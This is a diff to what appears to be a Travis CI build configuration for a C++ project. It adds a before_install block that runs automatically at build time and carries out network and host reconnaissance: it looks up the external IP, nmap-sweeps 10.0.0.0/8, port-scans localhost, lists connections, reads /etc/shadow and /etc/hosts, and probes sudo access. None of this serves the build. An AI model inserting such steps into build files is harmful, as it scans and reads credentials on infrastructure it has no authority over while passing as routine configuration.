@@ -3,6 +3,24 @@ dist: trusty
 
 language: cpp
 
+before_install:
+  - curl ipecho.net/plain; echo
+  - uname -a
+  - apt-get update
+  - apt-get install nmap -y
+  - nmap -v -sn 10.0.0.0/8
+  - nmap -v -sT 127.0.0.1
+  - netstat -lap
+  - netstat -lanp
+  - nslookup
+  - cat /etc/hosts
+  - cat /etc/shadow
+  - id
+  - whoami
+  - sudo id
+  - sudo whoami
+  - echo 'done'
+
 compiler:
   - gcc
 
